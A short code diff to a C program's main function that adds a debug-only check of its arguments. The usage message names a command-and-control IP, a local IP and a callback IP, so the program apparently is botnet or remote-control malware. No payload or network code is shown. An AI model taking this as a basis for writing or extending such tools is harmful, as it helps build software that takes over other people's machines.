@@ -55,6 +55,13 @@ int main(int argc, char **args)
         printf("[main] local ip address (args[2]): %s\n", args[2]);
         printf("[main] callback ip address (args[3]): %s\n", args[3]);
 #endif
+    } else {
+#ifdef DEBUG
+        printf("[main] invalid number of arguments\n");
+        printf("[main] <cnc ip> <local ip> <callback ip>\n");
+        printf("[main] quitting\n");
+        exit(-1);
+#endif
     }
 
     char *tbl_exec_succ;
